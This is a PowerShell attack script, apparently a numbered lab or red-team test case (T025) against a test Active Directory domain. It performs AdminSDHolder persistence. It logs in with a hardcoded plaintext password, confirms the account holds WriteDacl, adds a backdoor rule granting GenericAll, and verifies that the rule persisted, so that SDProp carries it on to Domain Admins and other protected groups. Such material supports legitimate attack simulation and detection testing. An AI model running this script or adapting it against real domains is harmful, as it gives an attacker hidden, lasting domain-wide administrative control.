# T025 AdminSDHolder persistence — ws01 native, as analyst_cloud (cadre.local)
# Surface: analyst_cloud has WriteDacl on CN=AdminSDHolder (05-ad-attack-surface.yml)
# Attack:
#   1. Bind as analyst_cloud, read AdminSDHolder DACL, verify WriteDacl present
#   2. Add backdoor ACE: analyst_cloud -> GenericAll on AdminSDHolder
#   3. Commit; SDProp (60 min) propagates to protected groups (Domain Admins etc.)
$ErrorActionPreference = "Stop"
$user = "cadre.local\analyst_cloud"
$pass = "Cl0ud_An@lyst!"
$asd = "LDAP://CN=AdminSDHolder,CN=System,DC=cadre,DC=local"
$da  = "LDAP://CN=Domain Admins,CN=Users,DC=cadre,DC=local"

try {
    $de = New-Object DirectoryServices.DirectoryEntry($asd, $user, $pass)
    if (-not $de) { throw "AdminSDHolder bind failed" }
    $sd = $de.ObjectSecurity
    Write-Output "ASD_ACL_ENTRIES $($sd.AreAccessRulesProtected)"

    $identity = New-Object Security.Principal.NTAccount("cadre.local\analyst_cloud")
    $sid = $identity.Translate([Security.Principal.SecurityIdentifier])

    # --- Step 1: verify WriteDacl present on AdminSDHolder for analyst_cloud ---
    $rules = $sd.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])
    $writeDacl = $false
    foreach ($r in $rules) {
        $match = ($r.IdentityReference.Value -eq $sid.Value) -or ($r.IdentityReference.Translate([Security.Principal.SecurityIdentifier]).Value -eq $sid.Value)
        if ($match) {
            Write-Output ("ACE " + $r.AccessControlType + " rights=" + $r.ActiveDirectoryRights + " flags=" + $r.InheritanceFlags + " " + $r.IdentityReference.Value)
            if ($r.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl) {
                $writeDacl = $true
            }
        }
    }
    Write-Output "WRITE_DACL_PRESENT $writeDacl"
    if (-not $writeDacl) {
        Write-Output "T025_BLOCKED: analyst_cloud lacks WriteDacl on AdminSDHolder (surface not configured)"
        exit 1
    }

    # --- Step 2: add backdoor ACE — analyst_cloud GenericAll on AdminSDHolder ---
    $rights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
    $aclType = [System.Security.AccessControl.AccessControlType]::Allow
    $inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::All
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $rights, $aclType, [Guid]::Empty, $inheritance)
    $sd.AddAccessRule($rule)
    $de.CommitChanges()
    Write-Output "BACKDOOR_ACE_ADDED analyst_cloud GenericAll on AdminSDHolder"

    # --- Step 3: re-read to confirm persisted ---
    $de2 = New-Object DirectoryServices.DirectoryEntry($asd, $user, $pass)
    $sd2 = $de2.ObjectSecurity
    $rules2 = $sd2.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])
    $found = $false
    foreach ($r in $rules2) {
        $match = ($r.IdentityReference.Value -eq $sid.Value) -or ($r.IdentityReference.Translate([Security.Principal.SecurityIdentifier]).Value -eq $sid.Value)
        if ($match -and ($r.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll)) {
            $found = $true
            Write-Output "CONFIRMED " + $r.ActiveDirectoryRights
        }
    }
    if (-not $found) { throw "backdoor ACE not found after commit" }
    Write-Output "T025_DONE"
} catch {
    Write-Output "T025_FAIL $_"
    exit 1
}
